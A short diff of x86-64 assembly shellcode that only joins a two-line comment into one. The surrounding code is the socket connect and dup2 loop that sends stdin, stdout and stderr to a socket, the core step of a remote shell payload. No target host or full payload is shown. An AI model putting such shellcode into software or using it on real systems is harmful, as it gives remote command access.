@@ -25,8 +25,7 @@ connect:                           ;
 dup2:                              ;
    push byte 3                     ;      # Start with 3 and decrement
    pop rsi                         ;
-dup2_loop:                                # Duplicate socket fd into stdin,
-                                          # stdout and stderr, which fd are 0, 1 and 2
+dup2_loop:                                # Duplicate socket fd into stdin, stdout and stderr, which fd are 0, 1 and 2
    mov al, 33                      ;      # If there is no error, rax is 0 on connect and dup2
    dec esi                         ;
    syscall                         ;      # dup2(s, rsi)
